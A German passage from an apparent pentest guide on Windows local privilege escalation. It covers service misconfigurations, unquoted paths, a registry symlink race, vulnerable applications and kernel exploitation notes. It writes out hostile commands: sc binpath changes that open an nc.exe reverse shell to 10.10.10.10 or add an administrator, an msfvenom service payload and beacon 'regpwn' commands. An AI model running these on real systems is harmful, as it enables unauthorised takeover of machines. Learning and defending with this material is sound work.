Es wird empfohlen, das Binary **accesschk** von _Sysinternals_ zu verwenden, um die erforderliche Berechtigungsstufe für jeden Dienst zu überprüfen.

```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

Es wird empfohlen zu prüfen, ob "Authenticated Users" einen Dienst ändern können:

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[Du kannst accesschk.exe für XP hier herunterladen](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Dienst aktivieren

Wenn dieser Fehler auftritt (zum Beispiel bei SSDPSRV):

_Systemfehler 1058 ist aufgetreten._\
_Der Dienst kann nicht gestartet werden, entweder weil er deaktiviert ist oder weil ihm keine aktivierten Geräte zugeordnet sind._

Du kannst ihn mit folgendem Befehl aktivieren

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**Beachte, dass der Dienst upnphost auf SSDPSRV angewiesen ist, um zu funktionieren (unter XP SP1).**

**Ein weiterer Workaround** für dieses Problem besteht darin, Folgendes auszuführen:

```
sc.exe config usosvc start= auto
```

### **Dienst-Binärpfad ändern**

Wenn die Gruppe „Authenticated users“ über **SERVICE_ALL_ACCESS** für einen Dienst verfügt, kann die ausführbare Binärdatei des Dienstes geändert werden. So kannst du **sc** ändern und ausführen:

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### Dienst neu starten

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

Berechtigungen können über verschiedene Rechte erweitert werden:

- **SERVICE_CHANGE_CONFIG**: Ermöglicht die Neukonfiguration der Dienst-Binärdatei.
- **WRITE_DAC**: Ermöglicht die Neukonfiguration von Berechtigungen und damit das Ändern von Dienstkonfigurationen.
- **WRITE_OWNER**: Ermöglicht die Übernahme des Besitzes und die Neukonfiguration von Berechtigungen.
- **GENERIC_WRITE**: Beinhaltet ebenfalls die Möglichkeit, Dienstkonfigurationen zu ändern.
- **GENERIC_ALL**: Beinhaltet ebenfalls die Möglichkeit, Dienstkonfigurationen zu ändern.

Zur Erkennung und Ausnutzung dieser Schwachstelle kann _exploit/windows/local/service_permissions_ verwendet werden.

### Schwache Berechtigungen für Dienst-Binärdateien

Wenn ein Dienst als **`LocalSystem`**, **`LocalService`**, **`NetworkService`** oder mit einem privilegierten Domänenkonto ausgeführt wird, aber **Benutzer mit niedrigen Berechtigungen die Dienst-EXE-Datei oder ihren übergeordneten Ordner ändern können**, lässt sich der Dienst oft kapern, indem **die Binärdatei ersetzt und der Dienst neu gestartet wird**.

**Prüfe, ob du die von einem Dienst ausgeführte Binärdatei ändern kannst** oder ob du **Schreibberechtigungen für den Ordner hast**, in dem sich die Binärdatei befindet ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Mit **wmic** (nicht in system32) kannst du alle von einem Dienst ausgeführten Binärdateien abrufen und deine Berechtigungen mit **icacls** überprüfen:

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

Du kannst auch **sc** und **icacls** verwenden:

```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

Achte auf gefährliche ACLs für **`Everyone`**, **`BUILTIN\Users`** oder **`Authenticated Users`**, insbesondere **`(F)`**, **`(M)`** oder **`(W)`** für die Dienst-EXE oder das Verzeichnis, in dem sie liegt. Ein praktischer Ablauf zum Ausnutzen ist:<sup>[[27]](#references)</sup>

1. Ermittle mit `sc qc <service_name>` das Dienstkonto und den Pfad zur ausführbaren Datei.
2. Prüfe mit `icacls <path>`, ob die Binärdatei beschreibbar ist.
3. Ersetze die Dienst-Binärdatei durch einen Payload oder eine gültige bösartige Dienst-Binärdatei.
4. Starte den Dienst mit `sc stop <service_name> && sc start <service_name>` neu (oder warte auf einen Neustart bzw. einen Dienst-Trigger).

Nützliche automatisierte Prüfungen:<sup>[[28]](#references)</sup>

```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```

> Wenn der Dienst einem normalen Benutzer keinen Neustart erlaubt, prüfe, ob er beim Systemstart automatisch gestartet wird, eine Fehleraktion hat, die ihn erneut startet, oder indirekt von der Anwendung ausgelöst werden kann, die ihn verwendet.

### Berechtigungen zum Ändern der Dienstregistrierung

Du solltest prüfen, ob du eine Dienstregistrierung ändern kannst.\
Du kannst deine **Berechtigungen** für eine Dienst**registrierung** wie folgt **prüfen**:

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

Der ursprüngliche Berechtigungstest lautete:

Es sollte geprüft werden, ob **Authenticated Users** oder **NT AUTHORITY\INTERACTIVE** über `FullControl`-Berechtigungen verfügen. Falls ja, kann die vom Dienst ausgeführte Binärdatei geändert werden.

Prüfe, ob **Authenticated Users** oder **NT AUTHORITY\INTERACTIVE** Schreibberechtigungen für einen bestimmten Dienstschlüssel in der Registry haben. Ein ACL-Eintrag allein belegt keinen effektiven Zugriff: Deny-Einträge, das aktuelle Token und geerbte Berechtigungen sind ebenfalls relevant. Die Rechte für einen Registry-Schlüssel sind getrennt von den Rechten `SERVICE_CHANGE_CONFIG` und `SERVICE_START` für das Dienstobjekt zu betrachten. Für eine Rechteausweitung sind außerdem ein nutzbares Dienstkonfigurationsfeld, eine Möglichkeit zum Auslösen des Dienstes und eine privilegiertere Dienstidentität erforderlich. Siehe Microsofts Referenzen zu [registry-key rights](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights) und [service access-rights](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights).

So änderst du den Path der ausgeführten Binärdatei:

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

### Registry-Symlink-Race für beliebigen HKLM-Wertschreibzugriff (ATConfig)

Einige Windows-Barrierefreiheitsfunktionen erstellen benutzerspezifische **ATConfig**-Schlüssel, die später von einem **SYSTEM**-Prozess in einen HKLM-Sitzungsschlüssel kopiert werden. Eine Registry-**Symlink-Race** kann diesen privilegierten Schreibzugriff in einen **beliebigen HKLM-Pfad** umleiten und so einen primitiven Mechanismus zum **Schreiben beliebiger HKLM-Werte** bereitstellen.<sup>[[18]](#references)</sup>

Wichtige Speicherorte (Beispiel: Bildschirmtastatur `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` listet installierte Barrierefreiheitsfunktionen auf.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` speichert benutzergesteuerte Konfiguration.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` wird bei der Anmeldung bzw. bei Übergängen zum sicheren Desktop erstellt und ist für den Benutzer beschreibbar.

Ablauf des Angriffs (CVE-2026-24291 / ATConfig):

1. Lege den **HKCU-ATConfig**-Wert fest, der von SYSTEM geschrieben werden soll.
2. Löse die Kopie auf den sicheren Desktop aus (z. B. mit **LockWorkstation**), wodurch der AT-Broker-Ablauf gestartet wird.
3. **Gewinne die Race**, indem du ein **oplock** auf `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml` setzt. Wenn das oplock ausgelöst wird, ersetze den **HKLM-Session-ATConfig**-Schlüssel durch einen **Registry-Link** auf ein geschütztes HKLM-Ziel.
4. SYSTEM schreibt den vom Angreifer gewählten Wert in den umgeleiteten HKLM-Pfad.

Sobald du beliebige HKLM-Werte schreiben kannst, kannst du zur LPE übergehen, indem du Dienstkonfigurationswerte überschreibst:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/Befehlszeile)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Wähle einen Dienst, den ein normaler Benutzer starten kann (z. B. **`msiserver`**), und starte ihn nach dem Schreibzugriff. **Hinweis:** Die öffentliche Exploit-Implementierung **sperrt im Rahmen der Race den Arbeitsplatz**.

Beispiel-Tools (RegPwn BOF / standalone):<sup>[[19]](#references)</sup>

```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```

### Services registry AppendData/AddSubdirectory permissions

Wenn Sie diese Berechtigung für eine Registry haben, bedeutet das, dass **Sie daraus untergeordnete Registrys erstellen können**. Bei Windows-Diensten reicht das aus, um **beliebigen Code auszuführen**:


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Wenn der Pfad zu einer ausführbaren Datei nicht in Anführungszeichen steht, versucht Windows, jeden möglichen Pfadbestandteil vor einem Leerzeichen auszuführen.

Für den Pfad _C:\Program Files\Some Folder\Service.exe_ versucht Windows beispielsweise, Folgendes auszuführen:

```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

Führe alle nicht in Anführungszeichen gesetzten Dienstpfade auf, ausgenommen die von integrierten Windows-Diensten:

```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**Du kannst diese Schwachstelle mit metasploit erkennen und ausnutzen:** `exploit/windows/local/trusted\_service\_path` Mit metasploit kannst du manuell eine Dienst-Binärdatei erstellen:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

### Wiederherstellungsaktionen

Windows ermöglicht es Benutzern, Aktionen festzulegen, die ausgeführt werden, wenn ein Dienst ausfällt. Diese Funktion kann so konfiguriert werden, dass sie auf eine Binärdatei verweist. Ist diese Binärdatei austauschbar, ist möglicherweise eine Rechteausweitung möglich. Weitere Details finden Sie in der [offiziellen Dokumentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Ziele von Skripts geplanter Tasks

Bei einem aktivierten Task, der `cmd.exe /c` mit einer `.bat`- oder `.cmd`-Datei ausführt, sollten Sie sowohl das in den **Aktionsargumenten** angegebene Skript als auch `cmd.exe` überprüfen. Dasselbe gilt für ein explizites Dateiargument eines Interpreters, etwa PowerShell `-File`. Enthält eine geplante Batchdatei einen wörtlichen PowerShell-Aufruf mit `-File`, überprüfen Sie auch die ACL des referenzierten Skripts; Variablen, Bedingungen und Shell-Verkettungen müssen manuell nachverfolgt werden. Ein Skript oder übergeordnetes Verzeichnis, in das der Aufrufer schreiben kann, ist nur dann ein Hinweis auf eine kontenübergreifende Ausführung, wenn sich der konfigurierte Taskprinzipal vom Aufrufer unterscheidet und der Task diese Aktion tatsächlich erreicht. Eine ACL mit ausschließlich Hinzufüge-Rechten kann bei Skripts relevant sein, aber ein vorheriges `exit` oder ein anderer Kontrollfluss kann angehängte Zeilen unerreichbar machen. Bestätigen Sie die effektiven ACLs, den [Ausführungskontext des Tasks](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks), das Arbeitsverzeichnis, den Trigger und die Richtlinie zur Anwendungskontrolle, bevor Sie eine Rechteausweitung annehmen. Die Bestandsaufnahme sollte das Skript weder ändern noch den Task starten.

## Benannte Streams zugänglicher Dateien

Unter NTFS kann eine lesbare Datei einen benannten `:$DATA`-Stream enthalten, dessen Inhalt in einer gewöhnlichen Verzeichnisauflistung nicht angezeigt wird. Überprüfen Sie für eine kleine, relevante Auswahl zugänglicher Sicherungs- oder Konfigurationsdateien zunächst die Stream-**Namen und -Größen**, bevor Sie Inhalte öffnen. Windows stellt Streams über [`FindFirstStreamW` / `FindNextStreamW`](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams) und PowerShell über [`Get-Item -Stream *`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item) bereit. Ein Streamname, der auf ein Geheimnis hindeutet, ist lediglich ein Hinweis. Prüfen Sie den effektiven Lesezugriff auf die Datei, die Stream-Unterstützung des Dateisystems, ob der Stream verwendbare Anmeldedaten enthält und bei welchem Konto diese tatsächlich zur Authentifizierung genutzt werden. Vermeiden Sie bei der routinemäßigen Aufzählung rekursive Stream-Scans und die Ausgabe von Stream-Inhalten.

## Eingaben des geplanten Windows Driver Kit-Hilfsprogramms

Das optionale Windows Driver Kit enthält `StandaloneRunner.exe`, das in seinem Ausführungsverzeichnis die Dateien `command.txt`, `reboot.rsf` und eine Projektdatei `working\rsf.rsf` verwenden kann. Ein geplanter Task oder Dienst, der dieses Hilfsprogramm mit einem privilegierten Konto startet, kann Schreibzugriff mit geringen Berechtigungen auf diese Eingabedateien in Befehlsausführung im Kontext dieses Kontos umwandeln, selbst wenn die ausführbare Datei des Hilfsprogramms geschützt ist. Bestätigen Sie, dass es einen privilegierten Verbraucher gibt und **beide** Begleitdateien erstellt oder geändert werden können; das Auffinden des Hilfsprogramms allein reicht nicht aus.

Überprüfen Sie bei einem geplanten Task dessen [`WorkingDirectory`](https://learn.microsoft.com/en-us/windows/win32/taskschd/execaction-workingdirectory)-Aktion und die ACLs der beiden Begleitdateipfade. Gibt der Task kein Arbeitsverzeichnis an, ist das Verzeichnis der ausführbaren Datei lediglich ein Hinweis, den Sie überprüfen müssen, kein Beleg dafür, wo der Task seine Eingaben liest. Auch die Voraussetzung für die Projekt-Arbeitsdatei muss erfüllt sein. Überprüfen Sie den tatsächlichen Taskprinzipal, statt anzunehmen, dass der Task als SYSTEM ausgeführt wird.

## Anwendungen

### Installierte Anwendungen

Überprüfen Sie die **Berechtigungen der Binärdateien** (möglicherweise können Sie eine davon überschreiben und Ihre Berechtigungen erweitern) und der **Ordner** ([DLL Hijacking](dll-hijacking/index.html)).

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

#### Checkmk-Windows-Agent-Reparaturpfad

[CVE-2024-0670](https://checkmk.com/werk/16361) betrifft ältere Checkmk-Windows-Agents, die Befehlsdateien in `C:\Windows\Temp` schrieben und dann eine bereits vorhandene schreibgeschützte Datei ausführten, wenn das Ersetzen fehlschlug. Der Anbieter hat das Problem in 2.1.0p40, 2.2.0p23, 2.3.0b1 und 2.4.0b1 behoben. Prüfen Sie die vollständige installierte Patch-Version und ob der betroffene Agent-Vorgang ausgeführt werden kann; eine Versionsangabe nur für den Zweig wie `2.1` reicht nicht aus, um eine Gefährdung festzustellen. Die Enumeration kann Version, Dienststatus und Temp-Berechtigungen prüfen, ohne Dateien zu erstellen oder Agent-Befehle auszulösen.

#### ADSelfService-Plus-SAML-Dienstüberprüfung

[CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html) betraf ADSelfService Plus Build 6210 und frühere Versionen; der Anbieter hat das Problem in Build 6211 behoben. Die Schwachstelle ist nur relevant, wenn SAML SSO **aktiviert ist oder war**. Ein installierter Produkteintrag oder Dienstpfad ist daher ein Hinweis, aber kein Nachweis einer Schwachstelle: Prüfen Sie den genauen Build, den bisherigen SAML-Konfigurationsverlauf, die Netzwerk-Erreichbarkeit des Dienstes und das Konto, unter dem er ausgeführt wird. Codeausführung über den Dienst übernimmt die Berechtigungen dieses Kontos; für eine Ausführung als SYSTEM muss die Instanz als SYSTEM laufen. Eine lesbare `OfflineBackup_*.ezip` im Backup-Verzeichnis des Produkts ist ein separater Hinweis auf ein verschlüsseltes Backup, aber kein Beleg für ein verwendbares Kennwort oder diese SAML-Schwachstelle. Halten Sie Pfad und Zugriffsrechte fest, ohne die Datei bei einer routinemäßigen Enumeration zu entpacken.

#### Jenkins-Controller und Grenzen von Domänenkonten

Unterscheiden Sie auf einem Windows-Jenkins-Controller zwischen der Berechtigung, einen Job zu erstellen oder zu konfigurieren, und der Berechtigung, ihn zu starten: [Jenkins dokumentiert diese als separate Rechte `Job/Create`, `Job/Configure` und `Job/Build`](https://www.jenkins.io/doc/book/security/access-control/permissions/). Ein konfigurierter Zeitplan oder Remote-Trigger kann einen weiteren Weg zum Starten eines Builds bieten; prüfen Sie jedoch, ob dieser aktiviert ist und der Build tatsächlich ausgeführt wird. Die Ausführung erfolgt mit der Identität des Controllers oder des ausgewählten Agents, und gespeicherte Anmeldedaten können nur verwendet werden, wenn der Job auf deren Geltungsbereich zugreifen kann. Prüfen Sie außerdem den Zugriff auf die Metadaten in `JENKINS_HOME`: Jenkins speichert Anmeldedaten und Verschlüsselungsschlüssel in `credentials.xml`, `secrets/hudson.util.Secret` und `secrets/master.key` ([Jenkins-Geheimnisspeicherung](https://www.jenkins.io/doc/developer/security/secrets/)). Deren bloßes Vorhandensein gibt kein Kennwort preis; prüfen Sie den **Lesezugriff auf die benötigten Dateien** und einen separaten Pfad zur Wiederverwendung des Kontos, ohne Geheimnisse in gemeinsam genutzten Ausgaben auszugeben. Wenn dieses Konto über ein Schreibrecht auf `scriptPath` des AD-Benutzerobjekts verfügt, bestätigen Sie einen beschreibbaren Skriptpfad sowie einen tatsächlichen Anmelde- oder geplanten Vorgang, der als Zielbenutzer ausgeführt wird, bevor Sie dies als kontoübergreifende Ausführung einstufen. Weitere Gruppensteuerung erfordert eine separate Überprüfung der effektiven AD-Rechte.

#### Identität eines selbstgehosteten Azure-Pipelines-Agents

Unterscheiden Sie bei einem Azure DevOps Server- oder Azure-Pipelines-Projekt zwischen der Berechtigung, eine Pipeline **zu erstellen oder zu bearbeiten**, und der Berechtigung, sie **in die Warteschlange zu stellen** und den ausgewählten Agent-Pool zu verwenden; [Microsoft dokumentiert Pipeline-Berechtigungen](https://learn.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops) und [Pool-Autorisierung](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops) unabhängig voneinander. Wenn ein Konto mit geringeren Berechtigungen einen Skriptschritt einreichen und diese Pipeline auf einem selbstgehosteten Windows-Agent ausführen kann, läuft der Schritt als [konfiguriertes Betriebssystemkonto des Agents](https://learn.microsoft.com/azure/devops/pipelines/agents/agents). Prüfen Sie die genaue Pipeline, Einschränkungen für Branches und Ressourcen, den autorisierten Pool, einen ausführbaren Job und die Dienstidentität des Agents, bevor Sie einen kontoübergreifenden Wechsel oder einen Wechsel zu SYSTEM behaupten. Ein installierter Agent, eine Projektrolle oder alleiniger Schreibzugriff auf ein Repository sind nur Hinweise; prüfen Sie Berechtigungen und lokale Dienstmetadaten, ohne während einer passiven Enumeration einen Build zu starten.

#### Microsoft Entra Connect Sync-Anmeldedaten

[Microsoft unterscheidet](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions) zwischen dem **ADSync-Dienstkonto**, das den Synchronisierungsdienst ausführt und auf dessen SQL-Datenbank zugreift, und dem **AD-DS-Connector-Konto**, dessen Verzeichnisberechtigungen von den konfigurierten Synchronisierungsfunktionen abhängen. Connector-Anmeldedaten werden verschlüsselt in dieser Datenbank gespeichert; das Schlüsselmaterial wird [durch DPAPI unter dem ADSync-Dienstkonto geschützt](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account). Ein installierter Synchronisierungsdienst, eine Gruppe, deren Name auf lokale Administratorrechte hindeutet, oder alleiniger Datenbankzugriff belegen weder entschlüsselbare Anmeldedaten noch eine Rechteausweitung in der Domäne. Prüfen Sie separat die tatsächlichen Datenbank-Leserechte, den Zugriff des Dienstkontos auf Schlüssel, die Installations- und SQL-Konfiguration, die konfigurierte Connector-Identität und deren effektive AD-Berechtigungen. Eine routinemäßige Enumeration sollte nur Dienst- und Zugriffsmetadaten anzeigen, nicht die gespeicherten Geheimnisse abfragen oder ausgeben.

#### Berechtigungen für Druckertreiber-Support-DLLs

Ein installierter Druckertreiber kann Support-DLLs unter `C:\ProgramData` speichern und sie in einem privilegierteren Druckprozess laden. Prüfen Sie die ACLs des genauen Treiberverzeichnisses und der DLLs einschließlich übergeordneter Verzeichnisse und Reparse Points, auch wenn die WMI-Enumeration von Druckern verweigert wird. Beim [Problem mit dem Ricoh-Druckertreiber CVE-2019-19363](https://www.ricoh.com/info/2020/0122_1) lautete der gemeldete Pfad `C:\ProgramData\RICOH_DRV\<driver>\_common\dlz`; [die ursprüngliche Offenlegung](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/) beschreibt das Laden von DLLs durch `PrintIsolationHost.exe`. Eine beschreibbare ACL ist nur ein Hinweis: Prüfen Sie den effektiven Schreibzugriff unter Berücksichtigung verweigernder Einträge, ob der betreffende Treiber installiert ist und die Datei unter einer privilegierten Identität lädt sowie ob der Anbieter die Installation durch einen aktualisierten Treiber oder ein Sicherheitsprogramm behoben hat. Leiten Sie eine Schwachstelle nicht allein aus dem Verzeichnisnamen oder der Treiberversion ab.

### Schreibberechtigungen

Prüfen Sie, ob Sie eine Konfigurationsdatei ändern können, um eine spezielle Datei auszulesen, oder ob Sie eine Binärdatei ändern können, die von einem Administratorkonto ausgeführt wird (schedtasks).

Eine Möglichkeit, Schwachstellen bei Ordner- und Dateiberechtigungen im System zu finden, ist:

```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Notepad++-Plugin-Autoload-Persistenz/Ausführung

Notepad++ lädt automatisch jede Plugin-DLL in seinen `plugins`-Unterordnern. Wenn eine beschreibbare portable Installation/Kopie vorhanden ist, führt das Ablegen eines bösartigen Plugins bei jedem Start automatisch Code innerhalb von `notepad++.exe` aus (auch über `DllMain` und Plugin-Callbacks).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Beim Start ausführen

**Prüfe, ob du einen Registry-Eintrag oder eine Binärdatei überschreiben kannst, die von einem anderen Benutzer ausgeführt wird.**\
**Lies** die **folgende Seite**, um mehr über interessante **Autorun-Speicherorte zur Rechteausweitung** zu erfahren:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Treiber

Suche nach möglichen **ungewöhnlichen/veralteten Drittanbietertreibern**

```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```

Wenn ein Treiber eine beliebige Kernel-Read/Write-Primitive offenlegt (häufig bei schlecht entworfenen IOCTL-Handlern), kannst du durch direktes Stehlen eines SYSTEM-Tokens aus dem Kernel-Speicher deine Berechtigungen erhöhen.<sup>[[13]](#references)</sup> Die Schritt-für-Schritt-Technik findest du hier:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

{{#ref}}
kernel-mode-file-access-check-bypass.md
{{#endref}}

Verwandte Materialien zur Windows-Kernel-Exploitation:

{{#ref}}
../../binary-exploitation/windows-kernel-type-confusion-to-npfs-arbitrary-rw.md
{{#endref}}

Bei Race-Condition-Bugs, bei denen der verwundbare Aufruf einen vom Angreifer kontrollierten Object-Manager-Pfad öffnet, kann eine gezielte Verlangsamung der Suche (mit Komponenten maximaler Länge oder tiefen Verzeichnisketten) das Zeitfenster von Mikrosekunden auf mehrere zehn Mikrosekunden vergrößern:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/afd-rio-buffer-uaf.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/usb-midi-packet-size-pool-overflow.md
{{#endref}}

#### UAFs in cancel-safe queues, Offenlegungen aus dem paged pool und I/O-ring-Pivots

Einige Windows-Kernel-LPE-Ketten lassen sich aus zwei für sich genommen schwachen Bugs aufbauen: einer **Lifetime-Race in einer cancel-safe queue**, die eine Request/CBD freigibt, während die Queue-Sperre noch gehalten wird, und einer Offenlegung durch **Freigabe der Sperre vor dem Kopieren**, bei der eine freigegebene paged-pool-Allokation während `RtlCopyToUser` geleakt wird.<sup>[[29]](#references)</sup>

Hinweise zur Analyse und Exploitation:

- **Freigabe unter Sperre + anschließender Abbruch**: Suche nach einem Erfolgsablauf, der **Acquire -> CompleteRequest/free -> Release** ausführt, während der Abbruchpfad **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo** ausführt. Wenn der Erfolgsablauf `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` erreicht, bevor die CBDQ/CSQ-Sperre freigegeben wird, kann ein in `NtCancelIoFileEx -> IopCsqCancelRoutine` blockierter Thread später fortfahren und einen freigegebenen `PFLT_CALLBACK_DATA` an den Remove-Callback des Treibers übergeben.
- **Fordere das freigegebene Queue-Objekt zurück** mit einer gleich großen, vom Angreifer kontrollierten paged-pool-Allokation. `NPFS` Data Queue Entries eignen sich dafür, da Payload und Größe kontrollierbar sind und du sie später mit Pipe-Read-/Peek-Operationen untersuchen kannst. Wenn das freigegebene Objekt List-Links enthält, überschreibe sie mit einer **zyklischen Liste gefälschter Request-Nodes im Userspace**, damit der Treiber wiederholt vom Angreifer definierte Request-Strukturen verarbeitet, statt am ursprünglichen Listenanfang zu enden.
- **Werte einen vorhersagbaren Write auf**: Wenn der gefälschte Request einen verschachtelten Kontextzeiger umleitet, der für Bookkeeping-Writes verwendet wird (Zeitstempel / QPC / refcount-nahe Felder), erhältst du möglicherweise einen **adresskontrollierten, aber nicht wertkontrollierten** Kernel-Write. Ziele in diesem Fall auf das **length/size**-Feld eines gesprühten Pool-Objekts statt auf einen abschließenden Code-/Datenzeiger und durchsuche dann den Spray, bis das beschädigte Objekt einen **Out-of-Bounds-Read aus dem paged pool** ermöglicht.
- **Muster für racebare Offenlegungen**: Jeder Syscall, der `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` ausführt, ist ein vielversprechender Kandidat. Die Zuverlässigkeit steigt, wenn der Angreifer den kopierten Buffer vergrößern kann (zum Beispiel durch das Hinzufügen vieler Listen-/Ressourceneinträge, die die endgültige Allokationsgröße eines Serializers erhöhen), da der längere Copy das Austauschfenster vergrößert, ohne zwangsläufig einen Systemabsturz zu verursachen.
